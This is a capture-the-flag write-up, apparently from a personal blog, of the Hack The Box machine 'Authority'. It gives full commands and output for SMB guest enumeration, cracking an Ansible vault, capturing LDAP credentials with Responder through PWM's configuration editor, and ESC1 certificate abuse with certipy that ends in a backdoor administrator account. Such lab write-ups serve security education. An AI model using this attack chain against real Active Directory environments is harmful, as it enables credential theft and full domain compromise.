---
title: 'Hack The Box: Authority'
date: 2025-01-17 09:40:00 +0800
categories: [CTF]
tags: [active directory, adcs]
image:
  path: /assets/posts/2025-01-17-HackTheBox-Authority/thumbnail.png
---

This post is about the Hack The Box machine, Authority. I start off with a port scan to discover various services running on the machine. After enumerating SMB, I find encrypted Ansible strings for a password self-service application that is running on Apache Tomcat (8443/TCP). An offline password-cracking attack reveals the password to access the Configuration Editor of the password self-service application. After editing the configuration to send LDAP requests to the attacker-controlled machine, which is listening for LDAP traffic, I receive plaintext credentials for the `svc_ldap` user that is a member of the `Remote Management Users` group. After using WinRM to access the machine and obtain the `user.txt` flag, I enumerate the domain and find that ADCS is configured on the machine. Running Certipy reveals that the `CorpVPN` template is vulnerable to the ESC1 privilege escalation vulnerability. After exploiting the misconfigured template and troubleshooting a Kerberos-related error, I successfully obtain administrative access to the machine and acquire the `root.txt` flag.

## Enumeration

### Nmap

`Nmap` detects quite a few open ports on the machine.

```bash
$ Nmap 7.95 scan initiated Thu Jan 16 15:18:38 2025 as: nmap -sC -sV -T4 -p- -oA nmap/tcp-all -vvv 10.129.76.109
Increasing send delay for 10.129.76.109 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Warning: 10.129.76.109 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.76.109
Host is up, received reset ttl 127 (0.078s latency).
Scanned at 2025-01-16 15:18:38 EST for 1579s
Not shown: 65405 closed tcp ports (reset), 101 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-17 00:43:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T00:44:56+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
[...]
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T00:44:56+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
[...]
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-01-17T00:44:56+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
[...]
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
[...]
| E0r8uQuHmwNTgD5dUWuHtDv/oG7j63GuTNwEfZhtzR2rnN9Vf2IH9Zal
|_-----END CERTIFICATE-----
|_ssl-date: 2025-01-17T00:44:56+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/http      syn-ack ttl 127 Apache Tomcat (language: en)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn\'t have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-15T00:03:20
| Not valid after:  2027-01-17T11:41:44
| MD5:   124f:c497:5ee0:b2a6:3d12:b8a0:9008:9cb1
| SHA-1: 2da7:95e2:f681:c625:1369:383a:d573:1ee4:33bb:c4d1
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIGEmrZCaFAMA0GCSqGSIb3DQEBCwUAMBcxFTATBgNVBAMM
[...]
| SPrdwI/C3Sw8wJzy/+wuHdD+i6kcAEor56o=
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56815/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56823/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29698/tcp): CLEAN (Couldn\'t connect)
|   Check 2 (port 45771/tcp): CLEAN (Couldn\'t connect)
|   Check 3 (port 6855/udp): CLEAN (Timeout)
|   Check 4 (port 49345/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-17T00:44:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 16 15:44:57 2025 -- 1 IP address (1 host up) scanned in 1578.76 seconds
```

The machine appears to be a domain controller (DC). I will add  `<IP> authority authority.htb authority.authority.htb` to my `/etc/hosts` file.

### SMB - TCP 445

Let's start with enumerating SMB using [`NetExec`](https://github.com/Pennyw0rth/NetExec).

```bash
$ nxc smb 10.129.76.109
SMB         10.129.76.109   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
```

Although NULL sessions don\'t work against SMB, the built-in `guest` account can still authenticate successfully.

```bash
$ nxc smb 10.129.76.109 -u '' -p '' --shares
SMB         10.129.76.109   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.76.109   445    AUTHORITY        [+] authority.htb\: 
SMB         10.129.76.109   445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED

$ nxc smb authority -u 'guest' -p ''    
SMB         10.129.76.109   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.76.109   445    AUTHORITY        [+] authority.htb\guest: 
```

Next, I will try to enumerate SMB shares and any permissions the `guest` account might have been granted.

```bash
$ nxc smb authority -u 'guest' -p '' --shares
SMB         10.129.76.109   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.76.109   445    AUTHORITY        [+] authority.htb\guest: 
SMB         10.129.76.109   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.76.109   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.76.109   445    AUTHORITY        -----           -----------     ------
SMB         10.129.76.109   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.76.109   445    AUTHORITY        C$                              Default share
SMB         10.129.76.109   445    AUTHORITY        Department Shares                 
SMB         10.129.76.109   445    AUTHORITY        Development     READ            
SMB         10.129.76.109   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.76.109   445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.76.109   445    AUTHORITY        SYSVOL                          Logon server share 
```

The `guest` account seems to have `READ` access to the `Development` share.

Using [`smbclient.py`](https://github.com/fortra/impacket/blob/master/examples/smbclient.py), various interesting files and directories are identified.

```bash
$ smbclient.py authority.htb/guest@authority.htb -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Department Shares
Development
IPC$
NETLOGON
SYSVOL
# use Development
# ls
drw-rw-rw-          0  Fri Mar 17 09:37:34 2023 .
drw-rw-rw-          0  Fri Mar 17 09:37:34 2023 ..
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 Automation
# cd Automation
# ls
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 .
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 ..
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 Ansible
# cd Ansible
# ls
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 .
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 ..
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 ADCS
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 LDAP
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 PWM
drw-rw-rw-          0  Fri Mar 17 09:37:52 2023 SHARE
```

The `PWM` directory stands out. A quick Google search reveals the following project: <https://github.com/pwm-project/pwm>. The `ADCS` directory also stands out, but let\'s look at that later.

The `main.yml` at `/Automation/Ansible/PWM/defaults/` reveals a number of encrypted Ansible strings.

```bash
# cat /Automation/Ansible/PWM/defaults/main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

### Crack Ansible Vault Secret

To be able to crack the Ansible vault secret using `john` or `hashcat`, the hash needs to be converted to a different format using `ansible2john.py`.

```bash
$ ./ansible2john.py vault.hash | cut -d ':' -f2 | tee hash.txt
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
```

Let's attempt to recover the vault secret using `hashcat`.

```bash
hashcat -a 0 -m 16900 hash.txt /opt/SecLists/Passwords/rockyou.txt                          
hashcat (v6.2.6) starting

[....]

Dictionary cache hit:
* Filename..: /opt/SecLists/Passwords/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:![REDACTED]*
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16900 (Ansible Vault)
Hash.Target......: $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c7...f70da5
Time.Started.....: Thu Jan 16 16:12:14 2025 (2 secs)
Time.Estimated...: Thu Jan 16 16:12:16 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/SecLists/Passwords/rockyou.txt)
```

Using the recovered Ansible vault secret, I am able to decrypt the encrypted `pwm_admin_password` string.

```bash
$ cat vault-2.hash 
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531

$ cat vault-2.hash| ansible-vault decrypt
Vault password: 
Decryption successful
p[REDACTED]3
```

### HTTP - TCP 8443

Equipped with a potentially valid password, I find the PWM application running on Apache Tomcat at TCP port 8443. PWM is running in configuration mode....Interesting.

<img src="assets/posts/2025-01-17-HackTheBox-Authority/pwm-interface.png" alt="PWM Web Interface" width="1000"/>

Using the recovered PWM admin password, I am able to access the Configuration Editor. In the LDAP Connection settings, I find a configured LDAP Profile. Unfortunately, the LDAP Proxy Password cannot be retrieved using a web browser.

<img src="assets/posts/2025-01-17-HackTheBox-Authority/pwm-ldap-connection.png" alt="PWM LDAP Connections" width="1000"/>

At the top of the page, I find a button that says `Test LDAP Profile`. Perhaps, I could capture some kind of user credentials by running an LDAP server using [Responder](https://github.com/lgandx/Responder).

```bash
$ sudo ./Responder.py -i 10.10.14.197
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] You don't have an IPv6 address assigned.

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]
[...]
```

After running Responder, I enter an LDAP URL that points to my machine.

<img src="assets/posts/2025-01-17-HackTheBox-Authority/pwm-add-ldap-url.png" alt="PWM Add LDAP Connection String" width="1000"/>

I hit the `Test LDAP Profile` and see that I am able to capture user credentials for the `svc_ldap` domain account.

```bash
[...]
[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.76.109
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : l[REDACTED]!
```

### LDAP - TCP 389 / 636

After validating the captured credentials, I enumerate group memberships for the `svc_ldap` account.

```bash
$ nxc ldap authority -u 'svc_ldap' -p 'l[REDACTED]!' -M groupmembership -o 'USER=svc_ldap'
LDAP        10.129.76.109   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAPS       10.129.76.109   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
GROUPMEM... 10.129.76.109   389    AUTHORITY        [+] User: svc_ldap is member of following groups: 
GROUPMEM... 10.129.76.109   389    AUTHORITY        Remote Management Users
GROUPMEM... 10.129.76.109   389    AUTHORITY        Domain Users
```

## Shell as svc_ldap

The `svc_ldap` account is a member of the `Remote Management Users` group, granting it permission to connect via WinRM.

```bash
$ evil-winrm -i authority.htb -u 'svc_ldap' -p 'l[REDACTED]!' 

Evil-WinRM shell v3.7

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> write-output $env:username
svc_ldap
```

## Shell as Administrator

To escalate privileges, I enumerate the domain, only to find that ADCS (Active Directory Certificate Services) is running on the target machine.

```bash
$ nxc ldap authority -u 'svc_ldap' -p 'l[REDACTED]r!' -M adcs
LDAP        10.129.76.109   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAPS       10.129.76.109   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
ADCS        10.129.76.109   389    AUTHORITY        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.76.109   389    AUTHORITY        Found PKI Enrollment Server: authority.authority.htb
ADCS        10.129.76.109   389    AUTHORITY        Found CN: AUTHORITY-CA
```

Using [`Certipy`](https://github.com/ly4k/Certipy), I find a misconfigured `CorpVPN` certificate template. The template may be used by any domain computer to request a certificate as indicated by the presence of the `AUTHORITY.HTB\Domain Computers` group.

```bash
$ certipy find -u 'svc_ldap@authority.htb' -p 'l[REDACTED]!' -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication

```

Since the certificate template is vulnerable to [ESC1](https://posts.specterops.io/certified-pre-owned-d95910965cd2), I begin exploiting it by leveraging the default privilege of any Active Directory user to add up to 10 computer objects to the domain. [`addcomputer.py`](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py) allows me to create a new computer object on the domain.

```bash
$ addcomputer.py -computer-name 'FILE01$' -computer-pass 'mGND8%XxP$87*m#V!H8t3BqRwYvfJt' -dc-host authority.htb 'AUTHORITY.htb/svc_ldap:l[REDACTED]!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account FILE01$ with password mGND8%XxP$87*m#V!H8t3BqRwYvfJt.
```

Using the machine account name and password, I can now request a certificate based on the misconfigured `CorpVPN` template to impersonate the administrator account on the domain.

```bash
$ certipy req -username 'FILE01$@authority.htb' -password 'mGND8%XxP$87*m#V!H8t3BqRwYvfJt' -target authority.htb -ca 'AUTHORITY-CA' -template CorpVPN -upn 'administrator@authority.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

After obtaining the `administrator.pfx` certificate, My initial thought was to download Dirk-jan's `PKINIT tools` to ultimately be able to authenticate against services using Kerberos.

```bash
 git clone https://github.com/dirkjanm/PKINITtools
```

I attempted to request a TGT using `gettgtpkinit.py`, but encountered an error that stated, `KDC has no support for PADATA type (pre-authentication data)`.

```bash
$ python3 gettgtpkinit.py authority.htb/administrator administrator.ccache -cert-pfx ../administrator.pfx 
2025-01-16 17:43:47,650 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-16 17:43:48,015 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/home/n1ck3nd/HackTheBox/Authority/blog_files/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/home/n1ck3nd/HackTheBox/Authority/blog_files/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/home/n1ck3nd/HackTheBox/Authority/blog_files/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/home/n1ck3nd/.virtualenvs/PKINITtools-/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"
```

I researched the issue and found a helpful article: [Authenticating with Certificates When PKINIT is Not Supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html). Since PKINIT isn’t supported, I decided to attempt authentication using the certificate via Schannel against LDAP.

To be able to get a shell on the target machine, I create a user account and add it to the `administrators` group.

```bash
$ certipy auth -pfx administrator.pfx -dc-ip 10.129.76.109 -username administrator -domain authority.htb -ldap-shell 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.129.76.109:636'
[*] Authenticated to '10.129.76.109' as: u:HTB\Administrator
Type help for list of commands

# whoami
u:HTB\Administrator

# add_user file_svc
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: file_svc and password: lx422psz&lWm{C, result: OK

# add_user_to_group file_svc administrators
Adding user: file_svc to group Administrators result: OK
```

With the newly created user account, I am able to connect via WinRM and grab the `root.txt` flag.

```bash
$ evil-winrm -i authority.htb -u 'file_svc' -p 'lx422psz&lWm{C,'

Evil-WinRM shell v3.7

[...]

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\file_svc\Documents> write-output $env:username
file_svc
```
